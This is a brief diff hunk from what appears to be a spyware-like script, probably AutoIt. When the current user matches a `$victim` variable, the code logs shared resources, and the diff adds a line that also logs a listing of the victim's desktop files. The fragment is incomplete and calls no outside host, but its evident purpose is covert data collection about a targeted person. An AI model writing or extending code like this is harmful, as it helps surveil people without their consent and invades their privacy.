@@ -17,6 +17,8 @@ if AmIusername($victim) Then
 
 	  Log2File(shared())
 
+	  Log2File(ListDesktopFiles())
+
    EndIf
 
 EndIf
